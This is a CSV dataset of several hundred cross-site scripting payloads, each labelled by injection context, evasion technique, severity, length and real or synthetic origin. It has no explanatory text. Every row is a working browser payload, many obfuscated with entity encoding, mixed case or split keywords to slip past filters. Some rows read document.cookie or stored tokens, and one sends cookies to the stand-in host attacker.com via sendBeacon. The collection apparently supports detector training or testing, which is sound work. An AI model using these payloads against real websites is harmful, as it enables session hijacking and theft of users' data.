payload,context,technique,severity,length,source
"<style>:target {color:red;}</style><label id=x style=""transition:color 1s"" ontransitionstart=alert(1)></label>",tag_injection,none,medium,110,real
"<figcaption onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</figcaption>",tag_injection,none,medium,96,real
<meta onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</meta><input value=clickme>,tag_injection,none,medium,99,real
<var id=x tabindex=1 onfocus=alert(1)></var>,tag_injection,none,medium,44,real
<scRipT>FUncTioN('ConFirM(1)')();</sCriPt>,script_injection,synthetic,medium,42,synthetic
<img contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,57,real
<textarea src=x onscrollend=alert('XSS')>,tag_injection,synthetic,medium,41,synthetic
"<script>window['alert'](String.fromCharCode(88,83,83))</script>",script_injection,synthetic,high,63,synthetic
<link oninput=alert(document.domain) oninput=alert(document.domain)>,tag_injection,synthetic,medium,68,synthetic
"%3Ca
onbeforematch=prompt(document.domain)%3E",tag_injection,synthetic,medium,45,synthetic
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onanimationend=""alert(1)""></applet>",tag_injection,none,medium,97,real
"%22 ontransitionstart=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,64,synthetic
"<div draggable=""true"" contenteditable>drag me</div><td ondrop=alert(1) contenteditable style=display:block>drop here</td>",tag_injection,none,medium,121,real
"""%3E%3Cset onend=alert(1)%3E",tag_injection,synthetic,medium,28,synthetic
"<img src=""javascript:alert(2)"">",js_uri,none,medium,31,real
' %3E%3Csvg onpopstate=confirm(document.domain)%3E,attribute_escape,synthetic,medium,50,synthetic
"<IMG SRC=x onsubmit=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,59,real
"<ruby ondblclick=""alert(1)"">AnonKryptiQuz</ruby>",tag_injection,none,medium,48,real
"<button onmousedown=""alert(1)"">AnonKryptiQuz</button>",tag_injection,none,medium,53,real
<div onpointerenter=alert(1) style=display:block>AnonKryptiQuz</div>,tag_injection,none,medium,68,real
"<kbd draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",tag_injection,none,medium,83,real
<button popovertarget=x>Click me</button><hgroup onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</hgroup>,tag_injection,none,medium,108,real
"(new Function(%22eval(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22))();",dom_sink,synthetic,high,89,synthetic
"onfullscreenchange=console.log(String.fromCharCode(88,83,83))",event_handler,synthetic,high,61,synthetic
"<samp oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",tag_injection,none,medium,71,real
"<title onclick=""alert(1)"" style=display:block>AnonKryptiQuz</title>",tag_injection,none,medium,67,real
"<style>@keyframes x{}</style><noembed style=""animation-name:x"" onwebkitanimationend=""alert(1)""></noembed>",tag_injection,none,medium,105,real
"<style>@keyframes slidein {}</style><applet style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></applet>",tag_injection,none,medium,166,real
" onselect=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,47,synthetic
<map onpointerout=alert(1) style=display:block>AnonKryptiQuz</map>,tag_injection,none,medium,66,real
"<ol onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</ol>",tag_injection,none,medium,65,real
__${confirm(document.domain)}__::.x,template_injection,synthetic,medium,35,synthetic
"<rtc onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",tag_injection,none,medium,67,real
%27 ><svg onpagereveal=console.log(document.domain)>,attribute_escape,synthetic,medium,52,synthetic
 onhashchange=\u0061lert(location.hash),event_handler,synthetic,low,39,synthetic
"&quot; onanimationiteration=alert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,73,synthetic
' oNweBkiTfuLlsCreEncHanGe=AleRt('XSS') ',attribute_escape,synthetic,medium,41,synthetic
"OnsTalLed=jaVasCriPt:ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,63,synthetic
"SetTimEouT(""EvaL(lOcaTioN.hAsh)"",0)",dom_sink,synthetic,low,35,synthetic
`><img src=x onerror=alert(document.domain)>,attribute_escape,synthetic,medium,44,synthetic
%22 onclose=console.log(location.hash) %22,attribute_escape,synthetic,medium,42,synthetic
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=eval(btoa(document.cookie))>%22)",dom_sink,synthetic,high,97,synthetic
%3Cplaintext x=y onrepeat=prompt('XSS')%3E,tag_injection,synthetic,medium,42,synthetic
"""><Set onWebKitFulLscReeNchAngE=cOnsOle.loG('XSS')>",tag_injection,synthetic,medium,51,synthetic
"\"" onp&#97;g&#101;hid&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)//",attribute_escape,synthetic,low,72,synthetic
"""><img src=x ontransitionstart=confirm(document.domain)>",attribute_escape,synthetic,medium,56,synthetic
"\"" onprompt&#97;ction=consol&#101;.log('XSS')//",attribute_escape,synthetic,low,47,synthetic
onsubmit=confirm/**/(1),event_handler,synthetic,low,23,synthetic
"<listing draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",tag_injection,none,medium,90,real
"<svg><script xlink:href=data:,alert(1) />",script_injection,none,medium,41,real
 onwebkitanimationend=alert(1),event_handler,synthetic,medium,30,synthetic
<plAinTexT oNrePeaT=pRomPt('XSS')>,tag_injection,synthetic,medium,34,synthetic
"'><img src=x onmouseenter=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
'%3E%3Cimg src=x onpointermove=prompt(location.hash)%3E,attribute_escape,synthetic,medium,55,synthetic
%27 ontouchend=confirm(%27XSS%27) %27,attribute_escape,synthetic,medium,37,synthetic
<viDeo srC=x onDraGstArt=alErt('XSS')>,tag_injection,synthetic,medium,38,synthetic
[#confirm docum&#101;nt.dom&#97;in /],template_injection,synthetic,low,37,synthetic
"<output onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</output>",tag_injection,none,medium,65,real
"<style>@keyframes x{}</style><br style=""animation-name:x"" onwebkitanimationend=""alert(1)""></br>",tag_injection,none,medium,95,real
"<IFRAME SRC='f' onerror='alert(1)'></IFRAME>""-prompt(8)-""",tag_injection,case_variation,medium,57,real
&quot; onb&#101;for&#101;input=consol&#101;.log(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape,synthetic,low,82,synthetic
ons&#101;&#97;rch=consol&#101;.log/***/('XSS'),event_handler,synthetic,low,46,synthetic
"""><img src=x onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,86,synthetic
"__pRotO__[""oNenDed""]=ProMpt(doCumEnt.doMaiN)",dom_sink,synthetic,medium,44,synthetic
""" %3E%3Csvg onpagehide=alert(location.hash)%3E",attribute_escape,synthetic,medium,46,synthetic
%3C!--%3E%3Cmeta onsecuritypolicyviolation=prompt('XSS')%3E,tag_injection,synthetic,medium,59,synthetic
&quot; onbegin=confirm(location.hash) x=&quot;,attribute_escape,synthetic,medium,46,synthetic
&quot; onpagereveal=\u0061lert(location.hash) x=&quot;,attribute_escape,synthetic,low,54,synthetic
"<table onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</table>",tag_injection,none,medium,67,real
' ><svg onwaiting=prompt(document.domain)>,attribute_escape,synthetic,medium,42,synthetic
"' %3E%3Csvg onchange=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,62,synthetic
__${&#97;l&#101;rt(1)}__::.x,template_injection,synthetic,low,28,synthetic
<fieldset onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</fieldset>,tag_injection,none,medium,82,real
"`><img src=x onscroll&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,85,synthetic
"<link draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</link>",tag_injection,none,medium,86,real
%22 ><svg onmouseup=prompt(document.domain)>,attribute_escape,synthetic,medium,44,synthetic
"""><img src=x ontouchmov&#101;=prompt(1)>",attribute_escape,synthetic,medium,40,synthetic
""" ><svg onpoint&#101;rmov&#101;=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,62,synthetic
"__pRotO__[""oNbeForEcuT""]=coNsoLe.Log(doCumEnt.doMaiN)",dom_sink,synthetic,medium,53,synthetic
""" oNgoTpoIntErcAptUre=coNsoLe.Log('XSS') """,attribute_escape,synthetic,medium,42,synthetic
"<ifRamE	oNtoUchStaRt=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,59,synthetic
'><img src=x oncontextmenu=alert(1)>,attribute_escape,synthetic,medium,36,synthetic
"javascript://%2F%2F%27%2F%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E--%3E%3Cp%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B%27%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+'Audi%20RS5'.substr(0,4)}}XXX%3Cscript%3Ealert('AnonKryptiQuz')",template_injection,url_encoding,medium,362,real
' ><svg onblur=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,low,53,synthetic
on&#101;rror=j&#97;v&#97;script:consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,71,synthetic
"<style>@keyframes slidein {}</style><img style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></img>",tag_injection,none,medium,166,real
<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,tag_injection,none,medium,80,real
%22 onwebkitanimationend=confirm(%27XSS%27) %22,attribute_escape,synthetic,medium,47,synthetic
"j&#97;v&#97;script:consol&#101;.log/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri,synthetic,low,80,synthetic
<div/onp&#97;us&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,53,synthetic
"<keygen onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></keygen>",tag_injection,none,medium,285,real
"""><Img srC=x onErrOr=ConSolE.lOg(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,48,synthetic
oninput=alert&#40;location.hash&#41;,event_handler,synthetic,low,36,synthetic
\' OnpOpsTatE=aLerT(dOcuMenT.dOmaIn)//,attribute_escape,synthetic,medium,38,synthetic
"<ifr&#97;m&#101; ontouchst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,81,synthetic
"&quot; onerror=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,62,synthetic
"<scRipT>cOnfIrm`StRinG.fRomChaRCoDe(88,83,83)`</ScrIpt>",script_injection,synthetic,high,55,synthetic
%27 onreset=console.log(%27XSS%27) %27,attribute_escape,synthetic,medium,38,synthetic
' ><svG oNwaItiNg=ConFirM(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,43,synthetic
"<b onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</b>",tag_injection,none,medium,62,real
%3Ctable/ontouchend=prompt(document.domain)%3E,tag_injection,synthetic,medium,46,synthetic
&quot; ondblclick=console.log(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,49,synthetic
OneNd=ProMpt/*x*/(LocAtiOn.HasH),event_handler,synthetic,low,32,synthetic
<noscr	ipt/onpaste=confirm(location.hash)>,tag_injection,synthetic,medium,42,synthetic
"""><img src=x onbeforematch=alert('XSS')>",attribute_escape,synthetic,medium,40,synthetic
"<maRquEe OncLosE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,56,synthetic
"<div draggable=""true"" contenteditable>drag me</div><input2 ondragover=alert(1) contenteditable style=display:block>drop here</input2>",tag_injection,none,medium,133,real
"<small onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</small>",tag_injection,none,medium,68,real
 onKeyDowN=aLerT('XSS'),event_handler,synthetic,medium,23,synthetic
<svg/onload=location=/javas/.source%2B/cript:/.source%2B,dom_sink,url_encoding,high,56,real
`><img src=x ontouchend=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,42,synthetic
javascr	ipt:alert/*x*/(document.domain),js_uri,synthetic,low,39,synthetic
"<q onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</q>",tag_injection,none,medium,55,real
%22 ><svg onload=alert(1)>,attribute_escape,synthetic,medium,26,synthetic
"<section onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</section>",tag_injection,none,medium,89,real
onwebkitanimationend=\u0061lert&#40;1&#41;,event_handler,synthetic,low,42,synthetic
"	onfocus=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,55,synthetic
"<div draggable=""true"" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>",tag_injection,none,medium,113,real
"<ruby draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</ruby>",tag_injection,none,medium,84,real
<u onpointerup=alert(1) style=display:block>AnonKryptiQuz</u>,tag_injection,none,medium,61,real
"%3C!--%3E%3Cdiv onpause=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,64,synthetic
"onpromptdismiss=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,62,synthetic
<bdi onpointerenter=alert(1) style=display:block>AnonKryptiQuz</bdi>,tag_injection,none,medium,68,real
`><img src=x onwebkitfullscreenchange=\u0061lert('XSS')>,attribute_escape,synthetic,low,56,synthetic
<tr/onpointerrawupdate=\u0061lert(location.hash)>,tag_injection,synthetic,low,49,synthetic
 onmousedown=alert(1),event_handler,synthetic,medium,21,synthetic
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#101;v&#97;l(loc&#97;tion.h&#97;sh)>""",dom_sink,synthetic,low,97,synthetic
"setTimeout(""console.log(String.fromCharCode(88,83,83))"",0)",dom_sink,synthetic,high,58,synthetic
" onfocus=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,46,synthetic
"%3Ctr
ontransitionend=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,62,synthetic
<meta ondrop=\u0061lert(document.domain) ondrop=\u0061lert(document.domain)>,tag_injection,synthetic,low,76,synthetic
""" ><svg on&#101;nd&#101;d=&#97;l&#101;rt(1)>",attribute_escape,synthetic,low,44,synthetic
"' ><svg onanimationstart=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
{{constructor['constructor']('prompt(document.cookie)')()}},template_injection,synthetic,high,59,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rb>",tag_injection,none,medium,174,real
"<img src\x10=x onerror=""javascript:alert(1)"">",js_uri,none,medium,45,real
onpointermove=\u0061lert&#40;'XSS'&#41;,event_handler,synthetic,low,39,synthetic
'%3E%3Cimg src=x onfocusout=console.log(location.hash)%3E,attribute_escape,synthetic,medium,57,synthetic
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""consol&#101;.log(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"")",dom_sink,synthetic,low,133,synthetic
"x""><svg%0Donload=""window['alert']((document)['cookie'])"">",tag_injection,url_encoding,low,57,real
{{constructor['constructor']('prompt('XSS')')()}},template_injection,synthetic,medium,49,synthetic
"j&#97;v&#97;script:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=prompt('XSS') )//%0D%0A%0d%0&#97;",js_uri,synthetic,medium,86,synthetic
'><scr	ipt>prompt(document.domain)</scr	ipt>,script_injection,synthetic,medium,44,synthetic
"javascr	ipt:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert(String.fromCharCode(88,83,83)) )//%0D%0A%0d%0a",js_uri,synthetic,high,98,synthetic
`%3E%3Cimg src=x onend=alert('XSS')%3E,attribute_escape,synthetic,medium,38,synthetic
"<optgroup draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</optgroup>",tag_injection,none,medium,72,real
__proto__[%22onwaiting%22]=prompt(document.cookie),dom_sink,synthetic,high,50,synthetic
`%3E%3Cimg src=x onmousewheel=prompt('XSS')%3E,attribute_escape,synthetic,medium,46,synthetic
"<a href=""javas\x07cript:javascript:alert(8249)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""evAl(DocUmeNt.CooKie)""",dom_sink,synthetic,high,65,synthetic
<q onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</q><input value=clickme>,tag_injection,none,medium,102,real
<var id=x tabindex=1 onbeforeactivate=alert(1)></var>,tag_injection,none,medium,53,real
<emBed onMozFulLscReeNchAngE=cOnsOle.loG(dOcuMenT.dOmaIn)/>,tag_injection,synthetic,medium,59,synthetic
"ongotpoint&#101;rc&#97;ptur&#101;=j&#97;v&#97;script:&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,107,synthetic
%3Cxss x=y onend=prompt('XSS')%3E,tag_injection,synthetic,medium,33,synthetic
&quot; onpromptaction=console.log(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,53,synthetic
"""><obj&#101;ct onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(1)>",tag_injection,synthetic,low,76,synthetic
"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(9760)""></applet onreadystatechange>",js_uri,none,medium,117,real
document.body.innerHTML=%22<img src=x onerror=XMLHttpRequest(document.domain)>%22,dom_sink,synthetic,high,81,synthetic
"<div draggable=""true"" contenteditable>drag me</div><aside ondrop=alert(1) contenteditable>drop here</aside>",tag_injection,none,medium,107,real
%3Cmtext x=y onstalled=console.log(document.domain)%3E,tag_injection,synthetic,medium,54,synthetic
"<blInk	onPagEhiDe=ConFirM(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,high,57,synthetic
"<style>:target {transform: rotate(180deg);}</style><datalist id=x style=""transition:transform 2s"" ontransitionrun=print()></datalist>",tag_injection,none,low,133,real
<option onpointerover=alert(1) style=display:block>AnonKryptiQuz</option>,tag_injection,none,medium,73,real
"<progress onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",tag_injection,none,medium,78,real
<svg onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
%3C!--%3E%3Cform onreset=console.log(document.domain)%3E,tag_injection,synthetic,medium,56,synthetic
"<iframe src=mhtml:http://html5sec.org/AnonKryptiQuz.gif!xss.html></iframe>//[""'`-->]]>]</div>",generic,none,low,93,real
<form x=y onwebkitanimationend=prompt(%27XSS%27)>,tag_injection,synthetic,medium,49,synthetic
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationend=""alert(1)""></shadow>",tag_injection,none,medium,97,real
"__pRotO__[""oNtrAnsItiOneNd""]=aLerT(lOcaTioN.hAsh)",dom_sink,synthetic,medium,49,synthetic
javascr	ipt:confirm(1),js_uri,synthetic,medium,22,synthetic
<d&#101;t&#97;ils x=y onr&#101;p&#101;&#97;t=prompt(1)>,tag_injection,synthetic,medium,55,synthetic
"eval(""\u0061lert(btoa(document.cookie))"")",dom_sink,synthetic,high,41,synthetic
<image onpointerenter=alert(1) style=display:block>AnonKryptiQuz</image>,tag_injection,none,medium,72,real
"<button
ondragenter=alert(location.hash)>",tag_injection,synthetic,medium,41,synthetic
<xmP sRc=X oNtrAnsItiOneNd=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,48,synthetic
`><Img srC=x onBefOreCut=coNfiRm(1)>,attribute_escape,synthetic,medium,36,synthetic
<maTh OnsCroLleNd=ProMpt(doCumEnt.doMaiN) OnsCroLleNd=ProMpt(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,78,synthetic
' ><svg onmozfullscreenchange=alert(1)>,attribute_escape,synthetic,medium,39,synthetic
<!--><body onpoint&#101;rmov&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,73,synthetic
"<wbr draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</wbr>",tag_injection,none,medium,84,real
"""><Img srC=x onTraNsiTioNruN=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,72,synthetic
%3Cnoscript onpointerdown=prompt(document.domain)/%3E,tag_injection,synthetic,medium,53,synthetic
"<p onmouseover=""alert(1)"">AnonKryptiQuz</p>",tag_injection,none,medium,43,real
"<center onmouseleave=""alert(1)"">AnonKryptiQuz</center>",tag_injection,none,medium,54,real
#s&#101;t($x='&#97;l&#101;rt(docum&#101;nt.dom&#97;in)')$x,template_injection,synthetic,low,58,synthetic
"onp&#97;g&#101;r&#101;v&#101;&#97;l=&#97;l&#101;rt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,95,synthetic
"<ol onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</ol>",tag_injection,none,medium,57,real
document.write(%22<img src=x onerror=confirm(localStorage.getItem(%27token%27))>%22),dom_sink,synthetic,high,84,synthetic
"loc&#97;tion=""j&#97;v&#97;script:&#101;v&#97;l(1)""",dom_sink,synthetic,low,50,synthetic
"<embed onmousedown=""alert(1)"">AnonKryptiQuz</embed>",tag_injection,none,medium,51,real
"onpointercancel=javascript:alert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,63,synthetic
<rt contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,56,real
""" onsearch=alert(1) """,attribute_escape,synthetic,medium,21,synthetic
%27><img src=x onfocusin=console.log(location.hash)>,attribute_escape,synthetic,medium,52,synthetic
""" onend=console.log('XSS') """,attribute_escape,synthetic,medium,28,synthetic
<form onsearch=console.log(1)/>,tag_injection,synthetic,medium,31,synthetic
`%3E%3Cimg src=x ondrop=prompt('XSS')%3E,attribute_escape,synthetic,medium,40,synthetic
%22><script>console.log(document.domain)</script>,script_injection,synthetic,medium,49,synthetic
&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;,generic,none,medium,49,real
`><img src=x onsearch=confirm(1)>,attribute_escape,synthetic,medium,33,synthetic
%22 ><svg onbeforepaste=prompt(1)>,attribute_escape,synthetic,medium,34,synthetic
"<style>:target {transform: rotate(180deg);}</style><pre id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></pre>",tag_injection,none,medium,124,real
{{{confirm(docum&#101;nt.dom&#97;in)}}},template_injection,synthetic,medium,39,synthetic
OncAnpLay=coNfiRm&#40;1&#41;,event_handler,synthetic,low,28,synthetic
%27 ontouchmove=prompt(%27XSS%27) %27,attribute_escape,synthetic,medium,37,synthetic
<aside contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,59,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></q>",tag_injection,none,medium,172,real
"\"" onbeforepaste=confirm(document.domain)//",attribute_escape,synthetic,medium,43,synthetic
%27 ><svg ongestureend=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,41,synthetic
"\' OnpRomPtdIsmIss=prOmpT(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,58,synthetic
<b&#97;s&#101; x=y oninput=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,low,49,synthetic
"""><template onreset=alert(location.hash)>",tag_injection,synthetic,medium,41,synthetic
"""><td onk&#101;yup=confirm(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,53,synthetic
	onProMptActIon=coNfiRm(1),event_handler,synthetic,medium,26,synthetic
"""><img src=x onpoint&#101;rmov&#101;=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,67,synthetic
<script>Function('confirm(document.domain)')();</script>,script_injection,synthetic,medium,56,synthetic
"<SCRIPT>\u0061lert(String.fromCharCode(88,83,83))</SCRIPT>",script_injection,synthetic,high,58,synthetic
"<a href=""j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;"">X</a>",dom_sink,none,low,121,real
"<nextid onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</nextid>",tag_injection,none,medium,73,real
"<span onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</span>",tag_injection,none,medium,67,real
"<noscript onmouseup=""alert(1)"">AnonKryptiQuz</noscript>",tag_injection,none,medium,55,real
%3Clink x=y oninput=alert(document.domain)%3E,tag_injection,synthetic,medium,45,synthetic
OntRanSitIonStaRt=ConSolE.lOg(LocAtiOn.HasH),event_handler,synthetic,medium,44,synthetic
<xss ontoggle=console.log(%27XSS%27)/>,tag_injection,synthetic,medium,38,synthetic
"<strong onmousemove=""alert(1)"">AnonKryptiQuz</strong>",tag_injection,none,medium,53,real
location=%22javascript:XMLHttpRequest(location.hash)%22,dom_sink,synthetic,high,55,synthetic
\%22 onhashchange=prompt(%27XSS%27)//,attribute_escape,synthetic,medium,37,synthetic
oncopy=j&#97;v&#97;script:prompt(1),event_handler,synthetic,medium,35,synthetic
"<scr	ipt
>confirm(location.hash)</scr	ipt>",script_injection,synthetic,medium,42,synthetic
ontransitionstart=javascript:console.log('XSS'),event_handler,synthetic,medium,47,synthetic
&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;,generic,none,medium,68,real
%27 ><svg onfocus=console.log(location.hash)>,attribute_escape,synthetic,medium,45,synthetic
\' ondblclick=\u0061lert(1)//,attribute_escape,synthetic,low,29,synthetic
<scr	ipt onkeydown=confirm(document.domain) onkeydown=confirm(document.domain)>,tag_injection,synthetic,medium,79,synthetic
\' ons&#101;curitypolicyviol&#97;tion=consol&#101;.log(docum&#101;nt.dom&#97;in)//,attribute_escape,synthetic,low,82,synthetic
"<IMG SRC=x ondragenter=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,62,real
' ><svg ongestureend=confirm(location.hash)>,attribute_escape,synthetic,medium,44,synthetic
<pl&#97;int&#101;xt onr&#101;p&#101;&#97;t=prompt('XSS')>,tag_injection,synthetic,medium,57,synthetic
%3Cform	onpagereveal=console.log(location.hash)%3E,tag_injection,synthetic,medium,50,synthetic
<body onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</body><input value=clickme>,tag_injection,none,medium,99,real
<td onstalled=confirm('XSS')/>,tag_injection,synthetic,medium,30,synthetic
""" onpointerdown=console.log(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,60,synthetic
">""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>",attribute_escape,url_encoding,medium,198,real
